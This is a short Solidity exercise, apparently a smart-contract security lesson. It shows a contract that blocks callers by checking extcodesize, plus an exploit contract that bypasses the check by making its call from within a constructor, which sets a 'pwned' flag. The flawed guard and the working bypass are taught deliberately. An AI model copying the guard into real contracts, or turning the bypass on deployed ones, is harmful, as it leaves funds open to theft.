// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract NoContract {
    function isContract(address addr) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(addr)
        }
        return size > 0;
    }

    modifier noContract() {
        require(!isContract(msg.sender), "no contract allowed");
        _;
    }

    bool public pwned = false;

    fallback() external noContract {
        pwned = true;
    }
}

contract Zero {
    constructor(address _target) {
        // you can also write your code here
        // this might help
        // When contract is being created, code size (extcodesize) is 0.
       _target.call("");
    }
}

contract NoContractExploit {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
        // write your code here
        new Zero(target);
    }
}

